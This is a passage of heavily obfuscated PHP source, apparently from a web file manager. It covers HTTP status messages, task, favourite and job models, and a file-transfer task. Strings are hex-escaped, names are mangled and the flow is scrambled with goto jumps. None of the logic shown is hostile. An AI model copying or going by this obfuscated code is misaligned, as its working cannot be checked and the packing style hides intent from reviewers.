"\114\x65\x6e\147\164\150\40\x52\x65\161\165\x69\162\145\x64", "\64\61\x32" => "\120\162\145\143\157\156\144\x69\x74\x69\x6f\x6e\x20\106\141\x69\154\x65\144", "\64\x31\63" => "\x52\x65\161\165\145\163\164\40\105\x6e\164\x69\164\x79\x20\x54\157\x6f\40\x4c\x61\x72\x67\x65", "\64\x31\x34" => "\122\145\x71\x75\x65\x73\164\40\125\x52\x49\x20\124\157\157\40\114\141\162\147\x65", "\64\61\65" => "\x55\156\163\x75\160\x70\x6f\x72\x74\145\144\x20\x4d\145\144\151\141\x20\x54\x79\x70\145", "\x34\x31\x36" => "\122\145\x71\165\145\163\x74\145\144\40\x52\141\x6e\147\x65\x20\116\x6f\x74\x20\123\x61\x74\x69\163\x66\151\141\142\x6c\145", "\64\61\67" => "\x45\170\160\x65\143\164\x61\164\x69\x6f\x6e\40\106\x61\x69\154\145\x64", "\x34\x32\62" => "\x55\x6e\x70\162\157\x63\x65\163\x73\x61\142\154\145\40\105\x6e\x74\x69\x74\x79", "\64\x32\x33" => "\114\x6f\143\x6b\x65\x64", "\64\62\x34" => "\106\141\x69\x6c\145\x64\x20\104\145\x70\145\156\144\x65\156\x63\x79", "\x34\x32\x35" => "\125\156\x6f\162\x64\145\162\145\144\x20\x43\157\x6c\x6c\145\x63\164\151\x6f\156", "\x34\62\x36" => "\125\x70\147\x72\141\x64\x65\x20\122\x65\161\165\151\162\145\x64", "\64\62\x38" => "\x50\x72\x65\x63\x6f\x6e\x64\x69\x74\x69\157\156\x20\x52\145\x71\165\151\x72\145\144", "\x34\62\71" => "\124\x6f\157\x20\115\141\x6e\x79\40\122\145\x71\165\x65\x73\x74\163", "\x34\63\61" => "\x52\145\161\165\145\x73\164\x20\x48\145\x61\144\x65\x72\x20\106\x69\x65\x6c\x64\163\x20\x54\x6f\x6f\x20\x4c\x61\162\x67\145", "\x34\64\64" => "\116\x6f\40\122\x65\163\x70\x6f\156\x73\x65", "\64\x35\x30" => "\102\154\x6f\x63\x6b\145\144\x20\142\x79\40\x57\x69\x6e\144\157\167\163\x20\120\141\x72\145\x6e\164\x61\x6c\40\x43\x6f\156\x74\162\157\154\163", "\64\x35\x31" => "\125\156\141\166\141\x69\x6c\x61\142\154\x65\40\x46\157\x72\40\x4c\x65\x67\141\x6c\x20\122\145\x61\163\157\x6e\x73", "\64\x39\x34" => "\122\145\x71\x75\145\163\x74\x20\110\x65\141\144\145\162\40\x54\x6f\x6f\x20\x4c\141\x72\x67\145", "\65\x30\x30" => "\x49\156\164\145\162\156\x61\x6c\40\x53\x65\x72\x76\x65\x72\x20\x45\x72\x72\x6f\162", "\x35\60\x31" => "\116\157\x74\x20\111\x6d\160\x6c\145\x6d\145\x6e\164\145\x64", "\x35\x30\62" => "\x42\x61\x64\40\107\x61\164\145\167\x61\x79", "\x35\60\x33" => "\x53\x65\x72\166\151\x63\x65\40\125\x6e\141\166\x61\x69\x6c\141\x62\154\145", "\x35\60\x34" => "\107\x61\164\x65\167\x61\x79\40\x54\151\155\x65\x6f\x75\x74", "\65\x30\65" => "\x48\x54\124\x50\40\126\x65\162\x73\151\x6f\x6e\x20\x6e\157\x74\x20\163\x75\160\160\157\x72\x74\145\144", "\65\60\x37" => "\111\x6e\x73\x75\x66\146\x69\143\x69\x65\x6e\x74\x20\123\164\x6f\162\x61\147\x65"); public static function code($dø“ğ¥Šòâ) { $EÆ‹âÁò¦º =& $_SERVER[¿õñ]; $dø“ğ¥Šòâ = $dø“ğ¥Šòâ . $EÆ‹âÁò¦º[33]; $c„õõø·­ = self::$statusCode[$dø“ğ¥Šòâ]; $c„õõø·­ = $c„õõø·­ ? "\110\124\x54\120\57\61\x2e\x31\40{$dø“ğ¥Šòâ}\40" . $c„õõø·­ : $EÆ‹âÁò¦º[33]; return $c„õõø·­; } } goto cà¤â×°; A‚Ç¿ìÍø›: class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\x65\x6d\56\x74\141\x73\x6b\114\x69\163\164"; public $field = array("\x6e\x61\155\x65", "\x74\171\x70\145", "\145\166\x65\x6e\x74", "\x74\x69\155\145", "\144\145\x73\x63", "\x73\171\163\x74\145\x6d", "\145\x6e\x61\142\x6c\x65", "\154\x61\163\x74\122\165\x6e", "\x73\x6f\162\164"); public function listData($BÄÆì•Ï’Æ = false, $EµãÒ³’Ï‹ = "\163\x6f\162\x74", $EõÔË£¹Òô = false) { return parent::listData($BÄÆì•Ï’Æ, $EµãÒ³’Ï‹, $EõÔË£¹Òô); } public function add($dæ›®®š) { $Aê±•˜°à° =& $_SERVER[¿õñ]; $F‚á÷ê†˜ = $this->findByName($dæ›®®š[$Aê±•˜°à°[28]]); if ($F‚á÷ê†˜) { return !1; } $dæ›®®š[$Aê±•˜°à°[1316]] = 0; $dæ›®®š[$Aê±•˜°à°[2034]] = $this->getSort(); return parent::insert($dæ›®®š); } private function getSort() { $F°¬‘ÒéîÉ =& $_SERVER[¿õñ]; $E¼®õ“±Õí = parent::listData(); $A ØÆòëÄÆ = array_to_keyvalue($E¼®õ“±Õí, $F°¬‘ÒéîÉ[33], $F°¬‘ÒéîÉ[2034]); return empty($A ØÆòëÄÆ) ? 0 : max($A ØÆòëÄÆ) + 1; } public function update($dİâ¿×ó©, $DØê«À¤ùˆ) { $AŞÙ©†Ø¹‘ =& $_SERVER[¿õñ]; $aË §ïçĞ = $this->listData($dİâ¿×ó©); $aŒàÚØïë¹ = $this->findByName($DØê«À¤ùˆ[$AŞÙ©†Ø¹‘[28]]); if (!$aË §ïçĞ || $aŒàÚØïë¹ && $aŒàÚØïë¹[$AŞÙ©†Ø¹‘[364]] != $aË §ïçĞ[$AŞÙ©†Ø¹‘[364]]) { return !1; } return parent::update($dİâ¿×ó©, $DØê«À¤ùˆ); } public function remove($c¼ëù¼›Æ) { $DØñâ¨İ…£ = $this->listData($c¼ëù¼›Æ); if (!$DØñâ¨İ…£ || $DØñâ¨İ…£[$_SERVER[¿õñ][1059]]) { return !1; } return parent::remove($c¼ëù¼›Æ); } public function enable($D™ÛµÃÙÎ—) { $d£¯œ×´çÕ =& $_SERVER[¿õñ]; $B‚Öˆ‡«Ë = $this->listData($D™ÛµÃÙÎ—); $c·¤”¤İÆ = !$B‚Öˆ‡«Ë[$d£¯œ×´çÕ[1323]]; return $this->update($D™ÛµÃÙÎ—, array($d£¯œ×´çÕ[2367] => $c·¤”¤İÆ)); } public function run($f›¾¢à½Œ) { return $this->update($f›¾¢à½Œ, array($_SERVER[¿õñ][2368] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\x75\x73\x65\162\137\146\x61\166"; protected function cacheFunctionAlias($eÊ¡Í³ÉÁ¹) { $cğ°Ò‚–ÙÒ =& $_SERVER[¿õñ]; return array($cğ°Ò‚–ÙÒ[2369] => array(USER_ID, $cğ°Ò‚–ÙÒ[2370])); } protected function listData() { $Aó™ìƒŸâÉ =& $_SERVER[¿õñ]; $b„Ùñ§£ŒÔ = array($Aó™ìƒŸâÉ[1341] => USER_ID, $Aó™ìƒŸâÉ[432] => 0); $c¤¹óàçÚ„ = $Aó™ìƒŸâÉ[2371]; $eùÔ¢‹ƒ‘ì = $this->field($c¤¹óàçÚ„)->where($b„Ùñ§£ŒÔ)->order($Aó™ìƒŸâÉ[2372])->select(); return $eùÔ¢‹ƒ‘ì ? $eùÔ¢‹ƒ‘ì : array(); } protected function resetCache() { } protected function listView() { goto E„œíø–¸Ô; E„œíø–¸Ô: $fğåæêÓø” =& $_SERVER[¿õñ]; $eéÉäšğ” = $this->listData(); $B††ğ¢· = array_filter_by_field($eéÉäšğ”, $fğåæêÓø”[29], $fğåæêÓø”[379]); goto d–‰’îŒœ; c–£Ğ ™÷: $B’ËÚ…›‚Å = array_to_keyvalue($B’ËÚ…›‚Å, $fğåæêÓø”[366]); foreach ($eéÉäšğ” as $A–İ õ½îÊ => $Béç´•À³ò) { $Eç±ÔïÌí = $B’ËÚ…›‚Å[$Béç´•À³ò[$fğåæêÓø”[76]]]; $Eç±ÔïÌí = $Eç±ÔïÌí ? $Eç±ÔïÌí : array(); $eéÉäšğ”[$A–İ õ½îÊ] = array_merge($Eç±ÔïÌí, $Béç´•À³ò); } return $eéÉäšğ”; goto fÔ¼àğÚ´Ê; BƒÛÅ¢ŒÊŞ: $Eˆí ƒ‚Š = array($fğåæêÓø”[380] => array($fğåæêÓø”[381], $AéòĞ’’Î¢)); $B’ËÚ…›‚Å = Model($fğåæêÓø”[759])->listSource($Eˆí ƒ‚Š, $Dó­´¿˜‹İ); $B’ËÚ…›‚Å = array_merge($B’ËÚ…›‚Å[$fğåæêÓø”[74]], $B’ËÚ…›‚Å[$fğåæêÓø”[75]]); goto c–£Ğ ™÷; d–‰’îŒœ: $AéòĞ’’Î¢ = array_to_keyvalue($B††ğ¢·, $fğåæêÓø”[33], $fğåæêÓø”[76]); if (!$AéòĞ’’Î¢) { return $eéÉäšğ”; } $Dó­´¿˜‹İ = 2000; goto BƒÛÅ¢ŒÊŞ; fÔ¼àğÚ´Ê: } protected function addFav($aâãÅ›ù…½, $dàÈ±âªÆ = '', $dô—óöÔ– = "\163\157\165\x72\x63\145") { goto FîØÊ®ÜÏ‹; AåÍ®‘»ŞÜ: return $this->add($e÷¤ôŸœ); goto fÈ‰ƒè‚á; fßÙ®ª¸¯: $CéÖäİÍá = array($eëÜš–‹¯š[1341] => USER_ID, $eëÜš–‹¯š[432] => 0); $F°†Ó£ªÉ× = $this->where($CéÖäİÍá)->max($eëÜš–‹¯š[2034]); if (!$F°†Ó£ªÉ×) { $F°†Ó£ªÉ× = 0; } goto D‹¤Ô×èÊ°; FîØÊ®ÜÏ‹: $eëÜš–‹¯š =& $_SERVER[¿õñ]; $CéÖäİÍá = array($eëÜš–‹¯š[1341] => USER_ID, $eëÜš–‹¯š[432] => 0, $eëÜš–‹¯š[385] => $dô—óöÔ–, $eëÜš–‹¯š[384] => $aâãÅ›ù…½); if ($this->where($CéÖäİÍá)->find()) { return !1; } goto fßÙ®ª¸¯; D‹¤Ô×èÊ°: if (!$dàÈ±âªÆ && $dô—óöÔ– == $eëÜš–‹¯š[379]) { $B”‰ó‰º‚ = Model($eëÜš–‹¯š[1087])->where(array($eëÜš–‹¯š[380] => $aâãÅ›ù…½))->find(); if (!$B”‰ó‰º‚) { return !1; } $dàÈ±âªÆ = $B”‰ó‰º‚[$eëÜš–‹¯š[28]]; } $dàÈ±âªÆ = $this->getAutoName($dàÈ±âªÆ); $e÷¤ôŸœ = array($eëÜš–‹¯š[1341] => USER_ID, $eëÜš–‹¯š[432] => 0, $eëÜš–‹¯š[383] => $dàÈ±âªÆ, $eëÜš–‹¯š[384] => $aâãÅ›ù…½, $eëÜš–‹¯š[385] => $dô—óöÔ–, $eëÜš–‹¯š[2017] => $F°†Ó£ªÉ× + 1); goto AåÍ®‘»ŞÜ; fÈ‰ƒè‚á: } protected function remove($B×‡ğÊÑóÃ) { $AŠ“·³æåÏ =& $_SERVER[¿õñ]; $B»²ƒŠæ¸Á = array($AŠ“·³æåÏ[1341] => USER_ID, $AŠ“·³æåÏ[382] => $B×‡ğÊÑóÃ); return $this->where($B»²ƒŠæ¸Á)->delete(); } protected function removeByName($C‚Ş›Ó½¾æ) { $FÑÙÍİ£Î =& $_SERVER[¿õñ]; $E­ôêÑØ™ = array($FÑÙÍİ£Î[1341] => USER_ID, $FÑÙÍİ£Î[383] => $C‚Ş›Ó½¾æ, $FÑÙÍİ£Î[432] => 0); return $this->where($E­ôêÑØ™)->delete(); } protected function rename($c³ÈÀî„å†, $bƒ®ÄÃÌÜ—) { $F’½§®Ïéù =& $_SERVER[¿õñ]; if ($c³ÈÀî„å† == $bƒ®ÄÃÌÜ—) { return !1; } $b–Š‡ÙÖßˆ = $this->getAutoName($bƒ®ÄÃÌÜ—); if ($bƒ®ÄÃÌÜ— != $b–Š‡ÙÖßˆ) { return !1; } $d¾­ÉÒó = array($F’½§®Ïéù[1341] => USER_ID, $F’½§®Ïéù[432] => 0, $F’½§®Ïéù[28] => $c³ÈÀî„å†); return $this->where($d¾­ÉÒó)->save(array($F’½§®Ïéù[28] => $bƒ®ÄÃÌÜ—)); } protected function resetSort($aŸ™îÕîÒ…) { $bÛÉ˜Ïã”ª =& $_SERVER[¿õñ]; $EáÚÓ‚ = array($bÛÉ˜Ïã”ª[1341] => USER_ID); for ($eŒ¯ÓíˆÄ = 0; $eŒ¯ÓíˆÄ < count($aŸ™îÕîÒ…); $eŒ¯ÓíˆÄ++) { $EáÚÓ‚[$bÛÉ˜Ïã”ª[382]] = $aŸ™îÕîÒ…[$eŒ¯ÓíˆÄ]; $this->where($EáÚÓ‚)->save(array($bÛÉ˜Ïã”ª[2017] => $eŒ¯ÓíˆÄ + 1)); } return !0; } protected function moveTop($f×š‘ä³„Ë) { goto Fº£À§ÙÊ; Fº£À§ÙÊ: $Bê¤ºò©Ÿß =& $_SERVER[¿õñ]; $ešÁïÔÙâ = array($Bê¤ºò©Ÿß[1341] => USER_ID, $Bê¤ºò©Ÿß[432] => 0); $EÁß¨ŒîŒó = $this->where($ešÁïÔÙâ)->where(array($Bê¤ºò©Ÿß[28] => $f×š‘ä³„Ë))->find(); goto bÇùçõµ£…; AÒ¼ˆÇöÙË: $fàšƒ—èá = $c—ĞßÔÍğ©; $c—ĞßÔÍğ© = array_remove_value($c—ĞßÔÍğ©, $EÁß¨ŒîŒó[$Bê¤ºò©Ÿß[364]]); array_unshift($c—ĞßÔÍğ©, $EÁß¨ŒîŒó[$Bê¤ºò©Ÿß[364]]); goto aµÕ×ØÆ‰Š; aµÕ×ØÆ‰Š: return $this->resetSort($c—ĞßÔÍğ©); goto A¶¡›­˜Ô; bÇùçõµ£…: if (!$EÁß¨ŒîŒó) { return; } $c—ĞßÔÍğ© = $this->field($Bê¤ºò©Ÿß[364])->where($ešÁïÔÙâ)->order($Bê¤ºò©Ÿß[2372])->select(); $c—ĞßÔÍğ© = array_to_keyvalue($c—ĞßÔÍğ©, $Bê¤ºò©Ÿß[33], $Bê¤ºò©Ÿß[364]); goto AÒ¼ˆÇöÙË; A¶¡›­˜Ô: } protected function moveBottom($D ¯ÕÊÚ) { $Aâ‘ó¥™âÚ =& $_SERVER[¿õñ]; $B©Ü°§Ô¼Œ = array($Aâ‘ó¥™âÚ[1341] => USER_ID, $Aâ‘ó¥™âÚ[432] => 0); $c“çÉ„‹‹Ó = $this->where($B©Ü°§Ô¼Œ)->max($Aâ‘ó¥™âÚ[2034]); $Bªéˆî¤ÂÔ = array($Aâ‘ó¥™âÚ[2034] => $c“çÉ„‹‹Ó + 1); return $this->where($B©Ü°§Ô¼Œ)->where(array($Aâ‘ó¥™âÚ[28] => $D ¯ÕÊÚ))->save($Bªéˆî¤ÂÔ); } private function getAutoName($Fª‹Î¸·šÙ) { goto BòÀ°Øƒç; BòÀ°Øƒç: $e¦Öô»Óˆµ =& $_SERVER[¿õñ]; $DÀ¶±½å¼‚ = array($e¦Öô»Óˆµ[1341] => USER_ID, $e¦Öô»Óˆµ[432] => 0); $AòŞÓ«§ì¾ = $this->field($e¦Öô»Óˆµ[28])->where($DÀ¶±½å¼‚)->select(); goto cÙŸÎ…‘¿Ğ; cÙŸÎ…‘¿Ğ: $AòŞÓ«§ì¾ = array_to_keyvalue($AòŞÓ«§ì¾, $e¦Öô»Óˆµ[33], $e¦Öô»Óˆµ[28]); if (!$AòŞÓ«§ì¾ || !in_array($Fª‹Î¸·šÙ, $AòŞÓ«§ì¾)) { return $Fª‹Î¸·šÙ; } for ($a¾™øù†° = 0; $a¾™øù†° < count($AòŞÓ«§ì¾); $a¾™øù†°++) { if (!in_array($Fª‹Î¸·šÙ . "\x28{$a¾™øù†°}\51", $AòŞÓ«§ì¾)) { return $Fª‹Î¸·šÙ . "\50{$a¾™øù†°}\x29"; } } goto eŠÄºÚÈ†; eŠÄºÚÈ†: return $Fª‹Î¸·šÙ . "\50{$a¾™øù†°}\x29"; goto B”¸§Ë…°˜; B”¸§Ë…°˜: } } class UserJobModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\145\x6d\56\152\x6f\142\x4c\151\163\164"; public $field = array("\156\x61\155\x65", "\144\x65\x73\143", "\x73\x6f\x72\x74"); const JOB_KEY = "\x73\x65\154\x66\112\x6f\142\114\151\163\164"; public function listData($bññ™ğˆÓ§ = false, $BğÀùÓŠ¹ = "\x73\157\x72\164", $eÄ«Á–Õ„İ = false) { return parent::listData($bññ™ğˆÓ§, $BğÀùÓŠ¹, $eÄ«Á–Õ„İ); } public function remove($CÇ£è‘ÂêÒ) { return parent::remove($CÇ£è‘ÂêÒ); } public function add($fëìË»°¶ù) { $DÂËªŸŞì¦ =& $_SERVER[¿õñ]; if ($this->findByName($fëìË»°¶ù[$DÂËªŸŞì¦[28]])) { return !1; } $fëìË»°¶ù[$DÂËªŸŞì¦[2034]] = $this->getSort(); return parent::insert($fëìË»°¶ù); } private function getSort() { $Eˆ‚¼ËçÇ¼ =& $_SERVER[¿õñ]; $bÅ¿“ªˆ”‚ = parent::listData(); $A±ñ™ëÛÕ‚ = array_to_keyvalue($bÅ¿“ªˆ”‚, $Eˆ‚¼ËçÇ¼[33], $Eˆ‚¼ËçÇ¼[2034]); return empty($A±ñ™ëÛÕ‚) ? 0 : max($A±ñ™ëÛÕ‚) + 1; } public function update($Dëš£ÑÅÙª, $aƒÕÈ›†ªÉ) { $CˆÔÔˆ¶š =& $_SERVER[¿õñ]; $f¹ì² âç = parent::listData($Dëš£ÑÅÙª); $Dòê’êšÓ÷ = $this->findByName($aƒÕÈ›†ªÉ[$CˆÔÔˆ¶š[28]]); if (!$f¹ì² âç || $Dòê’êšÓ÷ && $Dòê’êšÓ÷[$CˆÔÔˆ¶š[364]] != $f¹ì² âç[$CˆÔÔˆ¶š[364]]) { return !1; } return parent::update($Dëš£ÑÅÙª, $aƒÕÈ›†ªÉ); } public function setUserJob($eœîÔàÈ¢, $AŒÓ’óŒ‡‰) { goto fÑà†˜‡Òå; fÒø‹Œõ°¨: $d´ïõ£Úï® = rtrim($d´ïõ£Úï®, $E¦ çÅÁéí[47]); Model($E¦ çÅÁéí[469])->metaSet($eœîÔàÈ¢, self::JOB_KEY, $d´ïõ£Úï®); goto b¢ËŞ‚¾Ó; fÑà†˜‡Òå: $E¦ çÅÁéí =& $_SERVER[¿õñ]; if (!is_array($AŒÓ’óŒ‡‰)) { $AŒÓ’óŒ‡‰ = array($AŒÓ’óŒ‡‰); } $aÄğòâäÔÊ = parent::listData(); goto F›”Ö…¦‘ó; F›”Ö…¦‘ó: $d¨Ì£èÒ¢‚ = array_to_keyvalue($aÄğòâäÔÊ, $E¦ çÅÁéí[28]); $d´ïõ£Úï® = $E¦ çÅÁéí[358]; foreach ($AŒÓ’óŒ‡‰ as $A¹„ƒ÷Ö‡Ä) { if ($d¨Ì£èÒ¢‚[$A¹„ƒ÷Ö‡Ä]) { $d´ïõ£Úï® .= $d¨Ì£èÒ¢‚[$A¹„ƒ÷Ö‡Ä][$E¦ çÅÁéí[364]] . $E¦ çÅÁéí[47]; } else { $eÑ”ôÀœÛ“ = $this->add($A¹„ƒ÷Ö‡Ä); $d´ïõ£Úï® .= $eÑ”ôÀœÛ“ . $E¦ çÅÁéí[47]; } } goto fÒø‹Œõ°¨; b¢ËŞ‚¾Ó: } public function getUserJob($aøõò¤‘›½) { $AË‡™å¥± = Model($_SERVER[¿õñ][469])->metaGet($aøõò¤‘›½); return $this->getUserJobInfo($AË‡™å¥±[self::JOB_KEY]); } public function getUserJobInfo($AÎöá•Ô) { goto DêÚ£‡—°Š; DêÚ£‡—°Š: $cí×ÊŒ´Œá =& $_SERVER[¿õñ]; $Fºëö‡ÍŠ = explode($cí×ÊŒ´Œá[47], $AÎöá•Ô); $e¹‚Â›¸ï = parent::listData(); goto Eƒ¼¾ Ë×; Eƒ¼¾ Ë×: $e¹‚Â›¸ï = array_remove_key($e¹‚Â›¸ï, $cí×ÊŒ´Œá[184]); $DÓ­ „Ğ = array(); foreach ($Fºëö‡ÍŠ as $e÷ƒ–ˆôĞÏ) { if (isset($e¹‚Â›¸ï[$e÷ƒ–ˆôĞÏ])) { $DÓ­ „Ğ[] = $e¹‚Â›¸ï[$e÷ƒ–ˆôĞÏ]; } } goto F»ÀäöÂÇÚ; F»ÀäöÂÇÚ: return $DÓ­ „Ğ; goto e˜ë à¶‡; e˜ë à¶‡: } } goto Eê®Î°Š­É; CŠÔƒÙÌˆá: class TaskFileTransfer extends Task { protected function startAfter() { goto f½±áêÂÁÀ; a²ŒêÖ²Š: Hook::bind($D‘øè‚í‰³[535], array($this, $D‘øè‚í‰³[1382])); Hook::bind($D‘øè‚í‰³[502], array($this, $D‘øè‚í‰³[1383])); Hook::bind($D‘øè‚í‰³[499], array($this, $D‘øè‚í‰³[1383])); goto d¼È£ İ; D¸ÁÅ½ÁÌ: Hook::bind($D‘øè‚í‰³[1387], array($this, $D‘øè‚í‰³[1388])); Hook::bind($D‘øè‚í‰³[1389], array($this, $D‘øè‚í‰³[1390])); Hook::bind($D‘øè‚í‰³[1391], array($this, $D‘øè‚í‰³[1392])); goto D‰÷Ö„; Bõæ¨œÓ­÷: Hook::bind($D‘øè‚í‰³[1384], array($this, $D‘øè‚í‰³[1385])); Hook::bind($D‘øè‚í‰³[524], array($this, $D‘øè‚í‰³[1386])); $this->sourceModelCopyFlag = !1; goto D¸ÁÅ½ÁÌ; Fèµ‚èù: Hook::bind($D‘øè‚í‰³[531], array($this, $D‘øè‚í‰³[1380])); Hook::bind($D‘øè‚í‰³[532], array($this, $D‘øè‚í‰³[1381])); Hook::bind($D‘øè‚í‰³[534], array($this, $D‘øè‚í‰³[1382])); goto a²ŒêÖ²Š; D‰÷Ö„: $f²Šôå­É[$D‘øè‚í‰³[1393]] = LNG($D‘øè‚í‰³[1394]); $f²Šôå­É[$D‘øè‚í‰³[1395]] = 0; $f²Šôå­É[$D‘øè‚í‰³[1396]] = 0; goto FÙˆ°ßóâÜ; DÎÚæ•«í: Hook::bind($D‘øè‚í‰³[1374], array($this, $D‘øè‚í‰³[1375])); Hook::bind($D‘øè‚í‰³[1376], array($this, $D‘øè‚í‰³[1377])); Hook::bind($D‘øè‚í‰³[1378], array($this, $D‘øè‚í‰³[1379])); goto Fèµ‚èù; d¼È£ İ: Hook::bind($D‘øè‚í‰³[504], array($this, $D‘øè‚í‰³[1383])); Hook::bind($D‘øè‚í‰³[506], array($this, $D‘øè‚í‰³[1383])); Hook::bind($D‘øè‚í‰³[508], array($this, $D‘øè‚í‰³[1383])); goto Bõæ¨œÓ­÷; FÙˆ°ßóâÜ: $f²Šôå­É[$D‘øè‚í‰³[1295]] = $D‘øè‚í‰³[33]; $f²Šôå­É[$D‘øè‚í‰³[1397]] = $D‘øè‚í‰³[33]; $f²Šôå­É[$D‘øè‚í‰³[1398]] = 0; goto cï½´îÁ¨Ø; cï½´îÁ¨Ø: if (!$f²Šôå­É[$D‘øè‚í‰³[1247]]) { $f²Šôå­É[$D‘øè‚í‰³[1247]] = LNG($D‘øè‚í‰³[1399]); } goto F­‘ÁÈö¡“; f½±áêÂÁÀ: $D‘øè‚í‰³ =& $_SERVER[¿õñ]; $f²Šôå­É =& $this->task; $this->sourceCopyFolder = !1; goto DÎÚæ•«í; F­‘ÁÈö¡“: } protected function endAfter() { goto FöÅÒ¸¾‘; dªª®‹äÓ‚: Hook::unbind($eŒ…Ä±ˆ÷[534], array($this, $eŒ…Ä±ˆ÷[1382])); Hook::unbind($eŒ…Ä±ˆ÷[535], array($this, $eŒ…Ä±ˆ÷[1382])); Hook::unbind($eŒ…Ä±ˆ÷[502], array($this, $eŒ…Ä±ˆ÷[1383])); goto d¥®¬âÄÉ; Cß‹Æ½å’: Hook::unbind($eŒ…Ä±ˆ÷[1387], array($this, $eŒ…Ä±ˆ÷[1388])); Hook::unbind($eŒ…Ä±ˆ÷[1389], array($this, $eŒ…Ä±ˆ÷[1390])); Hook::unbind($eŒ…Ä±ˆ÷[1391], array($this, $eŒ…Ä±ˆ÷[1392])); goto aƒÇ¸÷˜ƒ­; FöÅÒ¸¾‘: $eŒ…Ä±ˆ÷ =& $_SERVER[¿õñ]; Hook::unbind($eŒ…Ä±ˆ÷[1374], array($this, $eŒ…Ä±ˆ÷[1375])); Hook::unbind($eŒ…Ä±ˆ÷[1376], array($this, $eŒ…Ä±ˆ÷[1377])); goto fİİ¨”Ì å; fİİ¨”Ì å: Hook::unbind($eŒ…Ä±ˆ÷[1378], array($this, $eŒ…Ä±ˆ÷[1379])); Hook::unbind($eŒ…Ä±ˆ÷[531], array($this, $eŒ…Ä±ˆ÷[1380])); Hook::unbind($eŒ…Ä±ˆ÷[532], array($this, $eŒ…Ä±ˆ÷[1381])); goto dªª®‹äÓ‚; d¥®¬âÄÉ: Hook::unbind($eŒ…Ä±ˆ÷[499], array($this, $eŒ…Ä±ˆ÷[1383])); Hook::unbind($eŒ…Ä±ˆ÷[504], array($this, $eŒ…Ä±ˆ÷[1383])); Hook::unbind($eŒ…Ä±ˆ÷[506], array($this, $eŒ…Ä±ˆ÷[1383])); goto aßÙöŞ†ã“; aßÙöŞ†ã“: Hook::unbind($eŒ…Ä±ˆ÷[508], array($this, $eŒ…Ä±ˆ÷[1383])); Hook::unbind($eŒ…Ä±ˆ÷[1384], array($this, $eŒ…Ä±ˆ÷[1385])); Hook::unbind($eŒ…Ä±ˆ÷[524], array($this, $eŒ…Ä±ˆ÷[1386])); goto Cß‹Æ½å’; aƒÇ¸÷˜ƒ­: } public function copyMoveStart($EÃïÒ²¬¶ò, $b¦ªß‹‹ŞÈ, $cƒŞ†ÅŒ¦‹, $dé¯Š¯˜¿) { } public function updateAfter() { goto EÊè¢ÜÜŸ; C°×ÈùˆŞ: if ($this->sourceModelCopyFlag) { return; } $Bµ½ÏÅ­Éõ = 0; if ($C±Óˆ« ™[$e–Œ©ğ‡ƒï[1397]] == $e–Œ©ğ‡ƒï[1025]) { $Bµ½ÏÅ­Éõ = $C±Óˆ« ™[$e–Œ©ğ‡ƒï[1396]] * 0.5; } else { if ($C±Óˆ« ™[$e–Œ©ğ‡ƒï[1397]] == $e–Œ©ğ‡ƒï[90]) { $Bµ½ÏÅ­Éõ = $C±Óˆ« ™[$e–Œ©ğ‡ƒï[1396]] * 0.5 + $C±Óˆ« ™[$e–Œ©ğ‡ƒï[1395]] * 0.5; } } goto a¸³é³óÊ; EÊè¢ÜÜŸ: $e–Œ©ğ‡ƒï =& $_SERVER[¿õñ]; $C±Óˆ« ™ =& $this->task; if (!$C±Óˆ« ™[$e–Œ©ğ‡ƒï[695]]) { return; } goto C°×ÈùˆŞ; a¸³é³óÊ: $C±Óˆ« ™[$e–Œ©ğ‡ƒï[1351]] = ($C±Óˆ« ™[$e–Œ©ğ‡ƒï[1400]] + $Bµ½ÏÅ­Éõ) / $C±Óˆ« ™[$e–Œ©ğ‡ƒï[695]]; if ($C±Óˆ« ™[$e–Œ©ğ‡ƒï[1351]] > 0) { $BµºåØ”ª‹ = timeFloat() - $C±Óˆ« ™[$e–Œ©ğ‡ƒï[1353]] - $C±Óˆ« ™[$e–Œ©ğ‡ƒï[1356]]; $C±Óˆ« ™[$e–Œ©ğ‡ƒï[1357]] = $BµºåØ”ª‹ * (1 - $C±Óˆ« ™[$e–Œ©ğ‡ƒï[1351]]) / $C±Óˆ« ™[$e–Œ©ğ‡ƒï[1351]]; } goto A‹§¡Òî´Ë; A‹§¡Òî´Ë: } public function addPath($A—­Š‰…ë) { goto E”õŸŞïí›; E”õŸŞïí›: $f¿ÑÊçÖ¥å =& $_SERVER[¿õñ]; $Bï‰à¬¢« =& $this->task; $aÒ‘¿²’ù‹ = IO::infoWithChildren($A—­Š‰…ë); goto DÃè‰×¢Æ¹; DÃè‰×¢Æ¹: $f½‘óÉ³Äù = $Bï‰à¬¢«[$f¿ÑÊçÖ¥å[1401]] ? $Bï‰à¬¢«[$f¿ÑÊçÖ¥å[1401]][$f¿ÑÊçÖ¥å[1402]] : 0; $Bï‰à¬¢«[$f¿ÑÊçÖ¥å[1401]] = array($f¿ÑÊçÖ¥å[1402] => $f½‘óÉ³Äù + 1, $f¿ÑÊçÖ¥å[383] => $aÒ‘¿²’ù‹[$f¿ÑÊçÖ¥å[28]], $f¿ÑÊçÖ¥å[76] => $aÒ‘¿²’ù‹[$f¿ÑÊçÖ¥å[76]], $f¿ÑÊçÖ¥å[462] => $aÒ‘¿²’ù‹[$f¿ÑÊçÖ¥å[462]] ? $aÒ‘¿²’ù‹[$f¿ÑÊçÖ¥å[462]] : $aÒ‘¿²’ù‹[$f¿ÑÊçÖ¥å[76]]); if ($aÒ‘¿²’ù‹[$f¿ÑÊçÖ¥å[29]] == $f¿ÑÊçÖ¥å[164]) { $Bï‰à¬¢«[$f¿ÑÊçÖ¥å[1293]] += 1; } else { $Bï‰à¬¢«[$f¿ÑÊçÖ¥å[1293]] += $aÒ‘¿²’ù‹[$f¿ÑÊçÖ¥å[81]][$f¿ÑÊçÖ¥å[79]]; if ($aÒ‘¿²’ù‹[$f¿ÑÊçÖ¥å[366]]) { $Bï‰à¬¢«[$f¿ÑÊçÖ¥å[1293]] += $aÒ‘¿²’ù‹[$f¿ÑÊçÖ¥å[81]][$f¿ÑÊçÖ¥å[80]] + 1; } } goto f£Àë‹İæª; f£Àë‹İæª: $Bï‰à¬¢«[$f¿ÑÊçÖ¥å[695]] += $aÒ‘¿²’ù‹[$f¿ÑÊçÖ¥å[78]]; $this->update(); goto b‡–Åñ™”Ğ; b‡–Åñ™”Ğ: } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = 